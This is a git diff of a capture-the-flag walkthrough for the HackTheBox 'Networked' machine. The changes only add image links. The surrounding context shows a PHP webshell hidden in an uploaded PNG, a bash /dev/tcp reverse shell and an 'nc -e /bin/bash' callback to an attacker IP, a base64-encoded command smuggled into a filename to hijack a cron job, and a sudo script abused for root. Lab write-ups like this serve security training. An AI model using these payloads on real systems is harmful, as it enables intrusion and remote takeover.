@@ -1,5 +1,5 @@
 # Networked [HTB](https://app.hackthebox.com/machines/203)
-![networked-01]()
+![networked-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/networked-01.png)
 
 
 ## Recon
@@ -10,7 +10,7 @@ After adding the target to my `/etc/hosts` file I start scanning for open ports:
 nmap -p- --min-rate 10000 networked.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/ports-02.png)
 
 
 From here we can run a version detection scan againts the found ports:
@@ -19,7 +19,7 @@ From here we can run a version detection scan againts the found ports:
 nmap -p 22,80,443 -sCV networked.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/nmap-res-03.png)
 
 We have the following:
 
@@ -37,7 +37,7 @@ Let's take a closer look at this Apache server.
 
 If we open the site at `http://networked.htb/` we get the following:
 
-![site-04]()
+![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/site-04.png)
 
 
 This message doesn't really tell us much, and on the surface there isn't much to do in this page. 
@@ -45,7 +45,7 @@ This message doesn't really tell us much, and on the surface there isn't much to
 
 But if take a look at the source code of this page we can see the following comment:
 
-![src-comment-05]()
+![src-comment-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/src-comment-05.png)
 
 
 This comment hints at possible subdirectories. So I ran a directory and file scan with:
@@ -55,7 +55,7 @@ ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/dire
 ```
 
 
-![ffuf-06]()
+![ffuf-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/ffuf-06.png)
 
 
 Let's go over the results.
@@ -70,7 +70,7 @@ This is the main page of the site where the initial message was shown.
 
 This to me looks like a listing of a directory:
 
-![empty-uploads-07]()
+![empty-uploads-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/empty-uploads-07.png)
 
 
 Typically, we should see another entry in a directory listing of `..` to represent the parent directory, but we don't see it here. Let's leave this directory alone for now and check the other ones. 
@@ -80,7 +80,7 @@ Typically, we should see another entry in a directory listing of `..` to represe
 
 Returns the following:
 
-![photos-08]()
+![photos-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/photos-08.png)
 
 
 This doesn't tell us much. 
@@ -95,7 +95,7 @@ Returns nothing, as can be seen from the `ffuf` scan.
 
 This is the most interesting directory from the scan, which hosts a tar archive:
 
-![backup-09]()
+![backup-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/backup-09.png)
 
 
 I downloaded the archive to my attack machine and listed it's contents:
@@ -104,7 +104,7 @@ I downloaded the archive to my attack machine and listed it's contents:
 tar tvf backup.tar
 ```
 
-![list-archive-10]()
+![list-archive-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/list-archive-10.png)
 
 
 This looks like the source code for the previous entries.
@@ -404,17 +404,17 @@ quit()
 
 After running the script, we can use `xxd` to verify that the file does have the proper PNG header magic numbers:
 
-![magic-png-11]()
+![magic-png-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/magic-png-11.png)
 
 
 This file should pass all checks imposed by the application, let's try to upload it:
 
-![uploaded-12]()
+![uploaded-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/uploaded-12.png)
 
 
 Great, let's check the `photos.php`: 
 
-![gallery-13]()
+![gallery-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/gallery-13.png)
 
 
 If we visit `http://networked.htb/uploads/10_10_14_101.png` we can get the file directly as well.
@@ -427,7 +427,7 @@ In the nextstep, we inject some php code into the file:
 <?php echo "START<br/><br/>\n\n\n"; system($_GET["cmd"]); echo "\n\n\n<br/><br/>END"; ?>
 ```
 
-![inject-14]()
+![inject-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/inject-14.png)
 
 
 This should break the image rendering completely, but if the file get's rendered as php it should give us a simple webshell.
@@ -435,12 +435,12 @@ This should break the image rendering completely, but if the file get's rendered
 
 Let's upload the file as `empty.php.png`, and try to access it at `http://networked.htb/uploads/10_10_14_101.png` 
 
-![broken-15]()
+![broken-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/broken-15.png)
 
 
 The iamge cannot be disaplyed, and understandably so. But if we add the `?cmd=id` argument we get the following:
 
-![id-16]()
+![id-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/id-16.png)
 
 
 What? why? 
@@ -463,7 +463,7 @@ rlwrap nc -lnvp 9001
 Then url-encode the following reverse shell payload `bash -i >& /dev/tcp/10.10.14.101/9001 0>&1` and send it in a request like this: `http://networked.htb/uploads/10_10_14_101.php.png?cmd=<payload>` and get a shell:
 
 
-![shell-17]()
+![shell-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/shell-17.png)
 
 
 ## Privilege Escalation
@@ -471,12 +471,12 @@ Then url-encode the following reverse shell payload `bash -i >& /dev/tcp/10.10.1
 
 When we land on the machine we get access as the `apache` service account. So if we check the content's of the `/home` directory we can see the following:
 
-![home-18]()
+![home-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/home-18.png)
 
 
 There is another user on the system named `guly` and we have read access to he's home directory, let's cehck what's inside:
 
-![guly-home-19]()
+![guly-home-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/guly-home-19.png)
 
 
 We can see two interesting files in `crontab.guly` and `check_attack.php`, let's read them.
@@ -485,7 +485,7 @@ We can see two interesting files in `crontab.guly` and `check_attack.php`, let's
 
 The file reads as such:
 
-![guly-cron-20]()
+![guly-cron-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/guly-cron-20.png)
 
 
 We can see that the `check_attack.php` script is run every 1/3 minutes via this cron job. 
@@ -547,7 +547,7 @@ So for example if we `base64` encode the payload we will get:
 echo nc -e /bin/bash 10.10.14.101 9001 | base64 -w0
 ```
 
-![encode-21]()
+![encode-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/encode-21.png)
 
 
 Now we can create a file like this:
@@ -556,7 +556,7 @@ Now we can create a file like this:
 touch 'a; echo "YmFzaCAtaSAvZGV2L3RjcC8xMC4xMC4xNC4xMDEgOTAwOSAwPiYxCg==" | base64 -d | sh; b'
 ```
 
-![touch-22]()
+![touch-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/touch-22.png)
 
 
 Then we can setup the local listener with:
@@ -568,7 +568,7 @@ rlwrap nc -lnvp 9009
 
 After a couple of seconds we get a shell as `guly`:
 
-![guly-shell-23]()
+![guly-shell-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/guly-shell-23.png)
 
 
 ### Guly
@@ -581,7 +581,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 Next, I run `sudo -l` to list any sudo permissions `guly` has:
 
-![sudo-24]()
+![sudo-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/sudo-24.png)
 
 
 We can see that `guly` can run the `/usr/local/sbin/changename.sh` bash script as root without supplying a password. The script reads as such:
@@ -616,7 +616,7 @@ I wasn't sure what to make of this script, other then it writes some interface p
 
 So I tried running the script:
 
-![run-25]()
+![run-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/run-25.png)
 
 
 Did the script just try to run my input as a command? 
@@ -624,7 +624,7 @@ Did the script just try to run my input as a command?
 
 Lets try to input `/bin/bash`:
 
-![root-26]
+![root-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Networked/img/root-26.png)
 
 
 Why this happens? 
